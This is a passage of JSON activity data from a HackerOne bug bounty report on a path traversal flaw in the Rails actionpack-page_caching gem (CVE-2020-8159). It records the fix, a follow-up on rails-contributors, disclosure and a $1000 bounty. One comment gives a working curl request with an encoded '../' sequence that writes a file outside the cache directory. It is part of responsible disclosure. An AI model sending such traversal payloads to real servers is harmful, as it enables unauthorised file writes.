href=\"/golden__retriever\"\u003e@golden__retriever\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2020-04-21T02:23:24.798Z","updated_at":"2020-04-21T02:23:24.798Z","actor":{"username":"golden__retriever","cleared":false,"url":"/golden__retriever","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/dvps5RJP9pxLcyqrY1FNC3H8/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7914985,"is_internal":false,"editable":false,"type":"Activities::CveIdAdded","message":"","markdown_message":"","automated_response":false,"created_at":"2020-05-06T16:46:40.838Z","updated_at":"2020-05-06T16:46:40.838Z","cve_ids":["CVE-2020-8159"],"actor":{"username":"tenderlove","cleared":false,"url":"/tenderlove","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/318/60d828744b5d16813ecbf975fdc453dc4a933f4f_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7915013,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hi, thanks.  We've shipped a fix for this in version 1.2.1 of actionpack_page-caching","markdown_message":"\u003cp\u003eHi, thanks.  We\u0026#39;ve shipped a fix for this in version 1.2.1 of actionpack_page-caching\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-06T16:49:00.561Z","updated_at":"2020-05-06T16:49:00.561Z","actor":{"username":"tenderlove","cleared":false,"url":"/tenderlove","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/318/60d828744b5d16813ecbf975fdc453dc4a933f4f_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"ooooooo_q","url":"/ooooooo_q"},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8025246,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@tenderlove \nhello,\nI confirmed it was fixed in 1.2.2.\n\nIs it possible to upgrade the version at rails-contributors?\nhttps://github.com/rails/rails-contributors/blob/master/Gemfile.lock#L28\n\nAfter confirming that it has been applied, I request a disclose for this report.\n","markdown_message":"\u003cp\u003e\u003ca href=\"/tenderlove\"\u003e@tenderlove\u003c/a\u003e \u003cbr\u003e\nhello,\u003cbr\u003e\nI confirmed it was fixed in 1.2.2.\u003c/p\u003e\n\n\u003cp\u003eIs it possible to upgrade the version at rails-contributors?\u003cbr\u003e\n\u003ca title=\"https://github.com/rails/rails-contributors/blob/master/Gemfile.lock#L28\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Frails%2Frails-contributors%2Fblob%2Fmaster%2FGemfile.lock%23L28\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/rails/rails-contributors/blob/master/Gemfile.lock#L28\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eAfter confirming that it has been applied, I request a disclose for this report.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-17T06:16:55.440Z","updated_at":"2020-05-17T06:16:55.440Z","actor":{"username":"ooooooo_q","cleared":false,"url":"/ooooooo_q","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8219829,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I found another attack pattern on https://github.com/rails/rails-contributors\n\nFor paths where `(.format)` is supported, it was possible to embed an attack in the format with `..` as `%2e%2e` as follows:\n\n```\ncurl \"http://localhost:3000/faq.%2f%2e%2e%2f%2e%2e%2ftest\"\n-\u003e test file is generated in root\n```","markdown_message":"\u003cp\u003eI found another attack pattern on \u003ca title=\"https://github.com/rails/rails-contributors\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Frails%2Frails-contributors\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/rails/rails-contributors\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eFor paths where \u003ccode\u003e(.format)\u003c/code\u003e is supported, it was possible to embed an attack in the format with \u003ccode\u003e..\u003c/code\u003e as \u003ccode\u003e%2e%2e\u003c/code\u003e as follows:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ecurl \u0026quot;http://localhost:3000/faq.%2f%2e%2e%2f%2e%2e%2ftest\u0026quot;\n-\u0026gt; test file is generated in root\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2020-06-06T11:54:33.519Z","updated_at":"2020-06-06T11:54:33.519Z","actor":{"username":"ooooooo_q","cleared":false,"url":"/ooooooo_q","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8279881,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"[rails-contributors fixed](https://github.com/rails/rails-contributors/commit/837c105f2c28e9322ebbe799c17f86837282306f)","markdown_message":"\u003cp\u003e\u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Frails%2Frails-contributors%2Fcommit%2F837c105f2c28e9322ebbe799c17f86837282306f\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003erails-contributors fixed\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2020-06-13T02:45:20.874Z","updated_at":"2020-06-13T02:45:20.874Z","first_to_agree":true,"actor":{"username":"ooooooo_q","cleared":false,"url":"/ooooooo_q","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8576235,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-07-13T02:45:21.723Z","updated_at":"2020-07-13T02:45:21.723Z","actor":{"url":"/rails","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Ruby on Rails"}},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9625572,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@tenderlove \nIs this report within the scope of Rails bounty?","markdown_message":"\u003cp\u003e\u003ca href=\"/tenderlove\"\u003e@tenderlove\u003c/a\u003e \u003cbr\u003e\nIs this report within the scope of Rails bounty?\u003c/p\u003e\n","automated_response":false,"created_at":"2020-10-24T22:49:48.952Z","updated_at":"2020-10-24T22:49:48.952Z","actor":{"username":"ooooooo_q","cleared":false,"url":"/ooooooo_q","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10159659,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2020-12-20T23:57:51.706Z","updated_at":"2020-12-20T23:57:51.706Z","actor":{"url":"/rails","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Ruby on Rails"}},"bounty_amount":"1000.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"rails","collaborator":{"username":"ooooooo_q","url":"/ooooooo_q"},"actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}